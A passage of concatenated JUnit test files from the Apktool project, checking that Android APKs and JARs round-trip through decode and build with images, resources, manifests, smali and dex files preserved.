        assertEquals(controlImage.getRGB(30, 30), testImage.getRGB(30, 30));
    }

    @Test
    public void issue1511Test() throws Exception {
        String fileName = "res/drawable-xxhdpi/textfield_activated_holo_dark.9.png";

        File control = new File(sTestOrigDir, fileName);
        File test = new File(sTestNewDir, fileName);

        BufferedImage controlImage = ImageIO.read(control);
        BufferedImage testImage = ImageIO.read(test);

        // Check entire image as we cannot mess this up
        int w = controlImage.getWidth();
        int h = controlImage.getHeight();

        int[] controlImageGrid = controlImage.getRGB(0, 0, w, h, null, 0, w);
        int[] testImageGrid = testImage.getRGB(0, 0, w, h, null, 0, w);

        for (int i = 0; i < controlImageGrid.length; i++) {
            assertEquals("Image lost Optical Bounds at i = " + i, controlImageGrid[i], testImageGrid[i]);
        }
    }

    @Test
    public void robust9patchTest() throws Exception {
        String[] ninePatches = {
            "ic_notification_overlay.9.png",
            "status_background.9.png",
            "search_bg_transparent.9.png",
            "screenshot_panel.9.png",
            "recents_lower_gradient.9.png",
        };

        for (String ninePatch : ninePatches) {
            String fileName = "res/drawable-xxhdpi/" + ninePatch;

            File control = new File(sTestOrigDir, fileName);
            File test = new File(sTestNewDir, fileName);

            BufferedImage controlImage = ImageIO.read(control);
            BufferedImage testImage = ImageIO.read(test);

            int w = controlImage.getWidth();
            int h = controlImage.getHeight();

            // Check the entire horizontal line
            for (int i = 1; i < w; i++) {
                if (isTransparent(controlImage.getRGB(i, 0))) {
                    assertTrue(isTransparent(testImage.getRGB(i, 0)));
                } else {
                    assertEquals("Image lost npTc chunk on image " + ninePatch + " at (x, y) (" + i + "," + 0 + ")",
                        controlImage.getRGB(i, 0), testImage.getRGB(i, 0));
                }
            }

            // Check the entire vertical line
            for (int i = 1; i < h; i++) {
                if (isTransparent(controlImage.getRGB(0, i))) {
                    assertTrue(isTransparent(testImage.getRGB(0, i)));
                } else {
                    assertEquals("Image lost npTc chunk on image " + ninePatch + " at (x, y) (" + 0 + "," + i + ")",
                        controlImage.getRGB(0, i), testImage.getRGB(0, i));
                }
            }
        }
    }

    private static boolean isTransparent(int pixel) {
        return (pixel >> 24) == 0;
    }

    @Test
    public void drawableXxhdpiTest() throws Exception {
        compareBinaryFolder("res/drawable-xxhdpi");
    }

    @Test
    public void drawableQualifierXxhdpiTest() throws Exception {
        compareBinaryFolder("res/drawable-xxhdpi-v4");
    }

    @Test
    public void drawableXxxhdpiTest() throws Exception {
        compareBinaryFolder("res/drawable-xxxhdpi");
    }

    @Test
    public void resRawTest() throws Exception {
        compareBinaryFolder("res/raw");
    }

    @Test
    public void storedMp3FilesAreNotCompressedTest() throws Exception {
        assertEquals(0, sTestApk.getDirectory().getCompressionLevel("res/raw/rain.mp3"));
    }

    @Test
    public void libsTest() throws Exception {
        compareBinaryFolder("lib");
    }

    @Test
    public void fileAssetTest() throws Exception {
        compareBinaryFolder("assets/txt");
    }

    @Test
    public void unicodeAssetTest() throws Exception {
        assumeTrue(!OSDetection.isWindows());
        compareBinaryFolder("assets/unicode-txt");
    }

    @Test
    public void unknownFolderTest() throws Exception {
        compareBinaryFolder("unknown");
    }

    @Test
    public void multipleDexTest() throws Exception {
        compareBinaryFolder("smali_classes2");
        compareBinaryFolder("smali_classes3");
        assertTrue(new File(sTestOrigDir, "build/apk/classes2.dex").isFile());
        assertTrue(new File(sTestOrigDir, "build/apk/classes3.dex").isFile());
    }

    @Test
    public void singleDexTest() throws Exception {
        compareBinaryFolder("smali");
        assertTrue(new File(sTestOrigDir, "build/apk/classes.dex").isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/BuildAndDecodeJarTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class BuildAndDecodeJarTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "testjar-orig");
        sTestNewDir = new File(sTmpDir, "testjar-new");

        log("Unpacking testjar...");
        copyResourceDir(BuildAndDecodeJarTest.class, "testjar", sTestOrigDir);

        log("Building testjar.jar...");
        File testJar = new File(sTmpDir, "testjar.jar");
        new ApkBuilder(sTestOrigDir, sConfig).build(testJar);

        log("Decoding testjar.jar...");
        new ApkDecoder(testJar, sConfig).decode(sTestNewDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/CompactResourceTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.xml.XmlUtils;
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class CompactResourceTest extends BaseTest {
    private static final String TEST_APK = "issue3366.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(CompactResourceTest.class, "issue3366", sTmpDir);
    }

    @Test
    public void checkIfDecodeSucceeds() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        Document doc = XmlUtils.loadDocument(new File(testDir, "res/values/strings.xml"));
        String expression = "/resources/string[@name]";
        NodeList nodes = XmlUtils.evaluateXPath(doc, expression, NodeList.class);
        assertEquals(1002, nodes.getLength());

        new ApkBuilder(testDir, sConfig).build(null);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/DebuggableFalseChangeToTrueTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;
import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;

public class DebuggableFalseChangeToTrueTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "issue2328-debuggable-false-orig");
        sTestNewDir = new File(sTmpDir, "issue2328-debuggable-false-new");

        log("Unpacking issue2328-debuggable-false...");
        copyResourceDir(DebuggableFalseChangeToTrueTest.class, "issue2328/debuggable-false", sTestOrigDir);

        sConfig.setDebuggable(true);
        sConfig.setVerbose(true);

        log("Building issue2328-debuggable-false.apk...");
        File testApk = new File(sTmpDir, "issue2328-debuggable-false.apk");
        new ApkBuilder(sTestOrigDir, sConfig).build(testApk);

        log("Decoding issue2328-debuggable-false.apk...");
        new ApkDecoder(testApk, sConfig).decode(sTestNewDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void debugIsTruePriorToBeingFalseTest() throws Exception {
        String expected =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
          + "<manifest package=\"com.ibotpeaches.issue2328\" platformBuildVersionCode=\"20\" platformBuildVersionName=\"4.4W.2-1537038\"\n"
          + "  xmlns:android=\"http://schemas.android.com/apk/res/android\">\n"
          + "    <application android:debuggable=\"true\"/>\n"
          + "</manifest>";

        String obtained = readTextFile(new File(sTestNewDir, "AndroidManifest.xml"));

        assertXMLEqual(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/DebuggableTrueAddedTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;
import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;

public class DebuggableTrueAddedTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "issue2328-debuggable-missing-orig");
        sTestNewDir = new File(sTmpDir, "issue2328-debuggable-missing-new");

        log("Unpacking issue2328-debuggable-missing...");
        copyResourceDir(DebuggableTrueAddedTest.class, "issue2328/debuggable-missing", sTestOrigDir);

        sConfig.setDebuggable(true);
        sConfig.setVerbose(true);

        log("Building issue2328-debuggable-missing.apk...");
        File testApk = new File(sTmpDir, "issue2328-debuggable-missing.apk");
        new ApkBuilder(sTestOrigDir, sConfig).build(testApk);

        log("Decoding issue2328-debuggable-missing.apk...");
        new ApkDecoder(testApk, sConfig).decode(sTestNewDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void debugIsTruePriorToBeingFalseTest() throws Exception {
        String expected =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
          + "<manifest package=\"com.ibotpeaches.issue2328\" platformBuildVersionCode=\"20\" platformBuildVersionName=\"4.4W.2-1537038\"\n"
          + "  xmlns:android=\"http://schemas.android.com/apk/res/android\">\n"
          + "    <application android:debuggable=\"true\"/>\n"
          + "</manifest>";

        String obtained = readTextFile(new File(sTestNewDir, "AndroidManifest.xml"));

        assertXMLEqual(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/DebuggableTrueRetainedTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;
import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;

public class DebuggableTrueRetainedTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "issue2328-debuggable-true-orig");
        sTestNewDir = new File(sTmpDir, "issue2328-debuggable-true-new");

        log("Unpacking issue2328-debuggable-true...");
        copyResourceDir(DebuggableTrueRetainedTest.class, "issue2328/debuggable-true", sTestOrigDir);

        sConfig.setDebuggable(true);
        sConfig.setVerbose(true);

        log("Building issue2328-debuggable-true.apk...");
        File testApk = new File(sTmpDir, "issue2328-debuggable-true.apk");
        new ApkBuilder(sTestOrigDir, sConfig).build(testApk);

        log("Decoding issue2328-debuggable-true.apk...");
        new ApkDecoder(testApk, sConfig).decode(sTestNewDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void debugIsTruePriorToBeingFalseTest() throws Exception {
        String expected =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
          + "<manifest package=\"com.ibotpeaches.issue2328\" platformBuildVersionCode=\"20\" platformBuildVersionName=\"4.4W.2-1537038\"\n"
          + "  xmlns:android=\"http://schemas.android.com/apk/res/android\">\n"
          + "    <application android:debuggable=\"true\"/>\n"
          + "</manifest>";

        String obtained = readTextFile(new File(sTestNewDir, "AndroidManifest.xml"));

        assertXMLEqual(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/DecodeArrayTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.meta.ApkInfo;
import brut.androlib.res.table.ResId;
import brut.androlib.res.table.ResTable;
import brut.androlib.res.table.value.ResArray;
import brut.androlib.res.table.value.ResValue;
import brut.directory.ExtFile;

import org.junit.*;
import static org.junit.Assert.*;

public class DecodeArrayTest extends BaseTest {
    private static ExtFile sTestApk;
    private static ResTable sTable;

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(MissingVersionManifestTest.class, "issue1994", sTmpDir);

        log("Decoding issue1994.apk...");
        sTestApk = new ExtFile(sTmpDir, "issue1994.apk");
        ApkInfo testInfo = new ApkInfo();
        testInfo.setApkFile(sTestApk);
        sTable = new ResTable(testInfo, sConfig);
        sTable.load();
    }

    @AfterClass
    public static void afterClass() throws Exception {
        sTestApk.close();
    }

    @Test
    public void decodeStringArray() throws Exception {
        ResValue value = sTable.resolveEntry(ResId.of(0x7F020001)).getValue();
        assertTrue("Not a ResArray. Found: " + value.getClass(), value instanceof ResArray);
    }

    @Test
    public void decodeArray() throws Exception {
        ResValue value = sTable.resolveEntry(ResId.of(0x7F020000)).getValue();
        assertTrue("Not a ResArray. Found: " + value.getClass(), value instanceof ResArray);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/DecodeResolveTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.xml.XmlUtils;
import org.w3c.dom.Document;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class DecodeResolveTest extends BaseTest {
    private static final String TEST_APK = "issue2836.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(DecodeResolveTest.class, "issue2836", sTmpDir);
    }

    @Test
    public void decodeResolveDefaultTest() throws Exception {
        sConfig.setDecodeResolve(Config.DecodeResolve.DEFAULT);

        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out.default");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        assertTrue(new File(testDir, "res/values/strings.xml").isFile());

        Document attrDocument = XmlUtils.loadDocument(new File(testDir, "res/values/attrs.xml"));
        assertEquals(4, attrDocument.getElementsByTagName("enum").getLength());

        Document colorDocument = XmlUtils.loadDocument(new File(testDir, "res/values/colors.xml"));
        assertEquals(8, colorDocument.getElementsByTagName("color").getLength());

        Document publicDocument = XmlUtils.loadDocument(new File(testDir, "res/values/public.xml"));
        assertEquals(22, publicDocument.getElementsByTagName("public").getLength());
    }

    @Test
    public void decodeResolveGreedyTest() throws Exception {
        sConfig.setDecodeResolve(Config.DecodeResolve.GREEDY);

        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out.greedy");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        assertTrue(new File(testDir, "res/values/strings.xml").isFile());

        File attrXml = new File(testDir, "res/values/attrs.xml");
        Document attrDocument = XmlUtils.loadDocument(attrXml);
        assertEquals(4, attrDocument.getElementsByTagName("enum").getLength());

        File colorXml = new File(testDir, "res/values/colors.xml");
        Document colorDocument = XmlUtils.loadDocument(colorXml);
        assertEquals(9, colorDocument.getElementsByTagName("color").getLength());

        File publicXml = new File(testDir, "res/values/public.xml");
        Document publicDocument = XmlUtils.loadDocument(publicXml);
        assertEquals(23, publicDocument.getElementsByTagName("public").getLength());
    }

    @Test
    public void decodeResolveLazyTest() throws Exception {
        sConfig.setDecodeResolve(Config.DecodeResolve.LAZY);

        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out.lazy");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        assertTrue(new File(testDir, "res/values/strings.xml").isFile());

        File attrXml = new File(testDir, "res/values/attrs.xml");
        Document attrDocument = XmlUtils.loadDocument(attrXml);
        assertEquals(3, attrDocument.getElementsByTagName("enum").getLength());

        File colorXml = new File(testDir, "res/values/colors.xml");
        Document colorDocument = XmlUtils.loadDocument(colorXml);
        assertEquals(8, colorDocument.getElementsByTagName("color").getLength());

        File publicXml = new File(testDir, "res/values/public.xml");
        Document publicDocument = XmlUtils.loadDocument(publicXml);
        assertEquals(21, publicDocument.getElementsByTagName("public").getLength());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/DecodeResourcesTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;
import java.util.Arrays;

import org.junit.*;
import static org.junit.Assert.*;

public class DecodeResourcesTest extends BaseTest {
    private static final String TEST_APK = "issue1680.apk";

    private static final byte[] XML_HEADER = {
        0x3C, // <
        0x3F, // ?
        0x78, // x
        0x6D, // m
        0x6C, // l
        0x20, // (empty)
    };

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(DecodeResourcesTest.class, "issue1680", sTmpDir);
    }

    @Test
    public void decodeResourcesNoneTest() throws Exception {
        sConfig.setDecodeResources(Config.DecodeResources.NONE);

        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out.none");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        // assert that manifest is not XML
        assertFalse(Arrays.equals(XML_HEADER, readHeaderOfFile(new File(testDir, "AndroidManifest.xml"), 6)));

        // assert that resources.arsc exists
        assertTrue(new File(testDir, "resources.arsc").isFile());
    }

    @Test
    public void decodeResourcesFullTest() throws Exception {
        sConfig.setDecodeResources(Config.DecodeResources.FULL);

        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out.full");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        // assert that manifest is XML
        assertTrue(Arrays.equals(XML_HEADER, readHeaderOfFile(new File(testDir, "AndroidManifest.xml"), 6)));

        // assert that resources.arsc does not exist
        assertFalse(new File(testDir, "resources.arsc").isFile());
    }

    @Test
    public void decodeResourcesOnlyManifestTest() throws Exception {
        sConfig.setDecodeResources(Config.DecodeResources.ONLY_MANIFEST);

        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out.manifest");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        // assert that manifest is XML
        assertTrue(Arrays.equals(XML_HEADER, readHeaderOfFile(new File(testDir, "AndroidManifest.xml"), 6)));

        // assert that resources.arsc exists
        assertTrue(new File(testDir, "resources.arsc").isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/DefaultBaksmaliVariableTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class DefaultBaksmaliVariableTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "issue1481-orig");
        sTestNewDir = new File(sTmpDir, "issue1481-new");

        log("Unpacking issue1481...");
        copyResourceDir(DefaultBaksmaliVariableTest.class, "issue1481", sTestOrigDir);

        log("Building issue1481.jar...");
        File testJar = new File(sTmpDir, "issue1481.jar");
        new ApkBuilder(sTestOrigDir, sConfig).build(testJar);

        log("Decoding issue1481.jar...");
        new ApkDecoder(testJar, sConfig).decode(sTestNewDir);
    }

    @Test
    public void confirmBaksmaliParamsAreTheSame() throws Exception {
        String expected =
            ".class public final Lcom/ibotpeaches/issue1481/BuildConfig;\n"
          + ".super Ljava/lang/Object;\n"
          + ".source \"BuildConfig.java\"\n"
          + "\n"
          + "\n"
          + "# static fields\n"
          + ".field public static final APPLICATION_ID:Ljava/lang/String; = \"com.ibotpeaches.issue1481\"\n"
          + "\n"
          + ".field public static final BUILD_TYPE:Ljava/lang/String; = \"debug\"\n"
          + "\n"
          + ".field public static final DEBUG:Z\n"
          + "\n"
          + ".field public static final FLAVOR:Ljava/lang/String; = \"\"\n"
          + "\n"
          + ".field public static final VERSION_CODE:I = 0x1\n"
          + "\n"
          + ".field public static final VERSION_NAME:Ljava/lang/String; = \"1.0\"\n"
          + "\n"
          + "\n"
          + "# direct methods\n"
          + ".method static constructor <clinit>()V\n"
          + "    .locals 1\n"
          + "\n"
          + "    .prologue\n"
          + "    .line 7\n"
          + "    const-string v0, \"true\"\n"
          + "\n"
          + "    invoke-static {v0}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z\n"
          + "\n"
          + "    move-result v0\n"
          + "\n"
          + "    sput-boolean v0, Lcom/ibotpeaches/issue1481/BuildConfig;->DEBUG:Z\n"
          + "\n"
          + "    return-void\n"
          + ".end method\n"
          + "\n"
          + ".method public constructor <init>()V\n"
          + "    .locals 0\n"
          + "\n"
          + "    .prologue\n"
          + "    .line 6\n"
          + "    invoke-direct {p0}, Ljava/lang/Object;-><init>()V\n"
          + "\n"
          + "    return-void\n"
          + ".end method";

        String obtained = readTextFile(new File(sTestNewDir, "smali/com/ibotpeaches/issue1481/BuildConfig.smali"));

        assertEquals(replaceNewlines(expected), replaceNewlines(obtained));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/DexStaticFieldValueTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class DexStaticFieldValueTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "issue2543-orig");
        sTestNewDir = new File(sTmpDir, "issue2543-new");

        log("Unpacking issue2543...");
        copyResourceDir(DexStaticFieldValueTest.class, "issue2543", sTestOrigDir);

        sConfig.setBaksmaliDebugMode(false);

        log("Building issue2543.jar...");
        File testJar = new File(sTmpDir, "issue2543.jar");
        new ApkBuilder(sTestOrigDir, sConfig).build(testJar);

        log("Decoding issue2543.jar...");
        new ApkDecoder(testJar, sConfig).decode(sTestNewDir);
    }

    @Test
    public void disassembleDexFileToKeepDefaultParameters() throws Exception {
        String expected =
            ".class public LHelloWorld;\n"
          + ".super Ljava/lang/Object;\n"
          + "\n"
          + "\n"
          + "# static fields\n"
          + ".field private static b:Z = false\n"
          + "\n"
          + ".field private static c:Z = true\n"
          + "\n"
          + "\n"
          + "# direct methods\n"
          + ".method public static main([Ljava/lang/String;)V\n"
          + "    .locals 1\n"
          + "\n"
          + "    return-void\n"
          + ".end method";

        String obtained = readTextFile(new File(sTestNewDir, "smali/HelloWorld.smali"));

        assertEquals(replaceNewlines(expected), replaceNewlines(obtained));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/DoubleExtensionUnknownFileTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.meta.ApkInfo;
import org.apache.commons.lang3.StringUtils;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class DoubleExtensionUnknownFileTest extends BaseTest {
    private static final String TEST_APK = "issue1244.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(DoubleExtensionUnknownFileTest.class, "issue1244", sTmpDir);
    }

    @Test
    public void multipleExtensionUnknownFileTest() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        ApkInfo testInfo = ApkInfo.load(testDir);
        for (String path : testInfo.getDoNotCompress()) {
            if (StringUtils.countMatches(path, '.') > 1) {
                assertTrue(path.equals("assets/bin/Data/sharedassets1.assets.split0"));
            }
        }
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/DynamicDexTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class DynamicDexTest extends BaseTest {
    private static final String TEST_APK = "dynamic_dex.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        log("Unpacking " + TEST_APK + "...");
        copyResourceDir(DynamicDexTest.class, "dynamic_dex", sTmpDir);
    }

    @Test
    public void decodeOnlyMainClassesTest() throws Exception {
        sConfig.setDecodeSources(Config.DecodeSources.ONLY_MAIN_CLASSES);

        log("Decoding " + TEST_APK + "...");
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out.main");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        log("Building " + TEST_APK + "...");
        new ApkBuilder(testDir, sConfig).build(null);
    }

    @Test
    public void decodeAllSourcesTest() throws Exception {
        sConfig.setDecodeSources(Config.DecodeSources.FULL);

        log("Decoding " + TEST_APK + "...");
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out.full");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        log("Building " + TEST_APK + "...");
        new ApkBuilder(testDir, sConfig).build(null);
    }
}

```

